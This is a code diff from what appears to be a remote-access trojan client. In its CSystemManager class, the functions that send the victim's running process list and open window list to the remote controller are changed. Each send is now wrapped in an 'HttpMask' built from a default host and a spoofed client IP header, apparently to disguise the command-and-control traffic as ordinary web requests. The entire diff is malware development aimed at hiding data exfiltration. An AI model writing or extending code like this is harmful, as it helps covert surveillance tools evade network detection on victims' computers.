@@ -38,8 +38,9 @@ VOID CSystemManager::SendProcessList()
 {
 	LPBYTE	szBuffer = GetProcessList();            //得到进程列表的数据
 	if (szBuffer == NULL)
-		return;	
-	m_ClientObject->Send2Server((char*)szBuffer, LocalSize(szBuffer));
+		return;
+	HttpMask mask(DEFAULT_HOST, m_ClientObject->GetClientIPHeader());
+	m_ClientObject->Send2Server((char*)szBuffer, LocalSize(szBuffer), &mask);
 	LocalFree(szBuffer);
 
 	szBuffer = NULL;
@@ -50,8 +51,8 @@ void CSystemManager::SendWindowsList()
 	LPBYTE	szBuffer = GetWindowsList();          //得到窗口列表的数据
 	if (szBuffer == NULL)
 		return;
-
-	m_ClientObject->Send2Server((char*)szBuffer, LocalSize(szBuffer));    //向主控端发送得到的缓冲区一会就返回了
+	HttpMask mask(DEFAULT_HOST, m_ClientObject->GetClientIPHeader());
+	m_ClientObject->Send2Server((char*)szBuffer, LocalSize(szBuffer), &mask);
 	LocalFree(szBuffer);	
 }
 
